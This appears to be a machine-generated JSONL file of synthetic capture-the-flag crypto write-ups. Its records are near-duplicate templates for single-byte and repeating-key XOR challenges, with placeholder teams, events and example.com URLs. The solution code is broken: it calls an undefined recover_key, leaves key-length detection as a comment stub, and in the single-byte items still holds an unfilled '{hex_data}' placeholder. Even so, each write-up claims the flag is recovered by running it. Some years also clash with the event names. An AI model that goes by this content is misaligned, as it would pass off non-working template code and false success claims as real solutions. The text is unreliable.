xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"6c918ded0f11985675b48f81ae6d7a0d33b0695192c74f79bf85710a93ca0b7f\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/35", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.829385", "synthetic": true}
{"id": "synthetic_xor_036", "team": "synthetic_team_2", "event": "CTF_2024_Event_4", "challenge_name": "Multi-byte XOR Key Reuse #37", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"6f4fbb0326e90aff527cc5fdfb9fd907867298e5487954accbe66a62147b24ed\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"6f4fbb0326e90aff527cc5fdfb9fd907867298e5487954accbe66a62147b24ed\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/36", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.829417", "synthetic": true}
{"id": "synthetic_xor_037", "team": "synthetic_team_8", "event": "CTF_2024_Event_12", "challenge_name": "Multi-byte XOR Key Reuse #38", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"11bcdea2134d83575b99b7b69f31d9b48a452416a75317c1b447c72b26dafc0b\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"11bcdea2134d83575b99b7b69f31d9b48a452416a75317c1b447c72b26dafc0b\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/37", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.829460", "synthetic": true}
{"id": "synthetic_xor_038", "team": "synthetic_team_3", "event": "CTF_2024_Event_2", "challenge_name": "Multi-byte XOR Key Reuse #39", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"e116d70a690a8c59aae6fb4cc19206e6de19b1c84ce86e2f06d00263e07f683e\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"e116d70a690a8c59aae6fb4cc19206e6de19b1c84ce86e2f06d00263e07f683e\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/38", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.829493", "synthetic": true}
{"id": "synthetic_xor_039", "team": "synthetic_team_7", "event": "CTF_2024_Event_14", "challenge_name": "Multi-byte XOR Key Reuse #40", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"f6587c17cb30eccf43ef0584e8ae7f238ff592e1fcb8cec085a2dec8c1d41a0d\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"f6587c17cb30eccf43ef0584e8ae7f238ff592e1fcb8cec085a2dec8c1d41a0d\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/39", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.829525", "synthetic": true}
{"id": "synthetic_xor_040", "team": "synthetic_team_6", "event": "CTF_2024_Event_11", "challenge_name": "Multi-byte XOR Key Reuse #41", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"ab69dd56a3643e62d53df1863f69a181f0895c8f4564b267ad42224263a22afb\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"ab69dd56a3643e62d53df1863f69a181f0895c8f4564b267ad42224263a22afb\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/40", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.829557", "synthetic": true}
{"id": "synthetic_xor_041", "team": "synthetic_team_1", "event": "CTF_2024_Event_17", "challenge_name": "Multi-byte XOR Key Reuse #42", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"8e4802478cbb4886cbf06485276961ad940ea6112e474246eb1fe2c2c581c9ef\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"8e4802478cbb4886cbf06485276961ad940ea6112e474246eb1fe2c2c581c9ef\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/41", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.829588", "synthetic": true}
{"id": "synthetic_xor_042", "team": "synthetic_team_2", "event": "CTF_2024_Event_5", "challenge_name": "Multi-byte XOR Key Reuse #43", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"0bb022a2c0114f8585bf11ff64254ceb7f9770d53c33e0723a95962bd9fab3ae\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"0bb022a2c0114f8585bf11ff64254ceb7f9770d53c33e0723a95962bd9fab3ae\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/42", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.829622", "synthetic": true}
{"id": "synthetic_xor_043", "team": "synthetic_team_6", "event": "CTF_2024_Event_20", "challenge_name": "Single Byte XOR #44", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/43", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.829655", "synthetic": true}
{"id": "synthetic_xor_044", "team": "synthetic_team_10", "event": "CTF_2024_Event_6", "challenge_name": "Multi-byte XOR Key Reuse #45", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"85936f5dce50070e466dc1d322f360976116c65b67a4e93d3e12b58a32558edc\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"85936f5dce50070e466dc1d322f360976116c65b67a4e93d3e12b58a32558edc\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/44", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.829692", "synthetic": true}
{"id": "synthetic_xor_045", "team": "synthetic_team_2", "event": "CTF_2024_Event_7", "challenge_name": "Single Byte XOR #46", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/45", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.829725", "synthetic": true}
{"id": "synthetic_xor_046", "team": "synthetic_team_4", "event": "CTF_2024_Event_14", "challenge_name": "Single Byte XOR #47", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/46", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.829756", "synthetic": true}
{"id": "synthetic_xor_047", "team": "synthetic_team_2", "event": "CTF_2024_Event_19", "challenge_name": "Single Byte XOR #48", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/47", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.829787", "synthetic": true}
{"id": "synthetic_xor_048", "team": "synthetic_team_3", "event": "CTF_2024_Event_14", "challenge_name": "Single Byte XOR #49", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/48", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.829819", "synthetic": true}
{"id": "synthetic_xor_049", "team": "synthetic_team_7", "event": "CTF_2024_Event_11", "challenge_name": "Multi-byte XOR Key Reuse #50", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"c660deecf478badabe9cd472ea0141986093d5d38ce58cbc0ce31616ff6420af\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"c660deecf478badabe9cd472ea0141986093d5d38ce58cbc0ce31616ff6420af\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/49", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.829850", "synthetic": true}
{"id": "synthetic_xor_050", "team": "synthetic_team_1", "event": "CTF_2024_Event_15", "challenge_name": "Single Byte XOR #51", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/50", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.829880", "synthetic": true}
